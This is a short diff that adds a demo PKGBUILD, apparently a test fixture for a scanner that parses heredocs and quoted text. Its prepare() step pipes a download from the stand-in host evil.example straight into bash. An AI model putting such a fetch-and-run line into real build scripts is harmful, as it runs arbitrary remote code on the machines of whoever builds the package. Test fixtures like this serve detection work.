@@ -1,0 +1,12 @@
+pkgname=demo-heredoc
+pkgver=1
+pkgrel=1
+arch=(any)
+prepare() {
+  echo 'a quoted cat <<EOF is only text'
+  curl -fsSL https://evil.example/x | bash
+  cat <<END-OF-NOTES
+printed
+END-OF-NOTES
+}
+package() { :; }
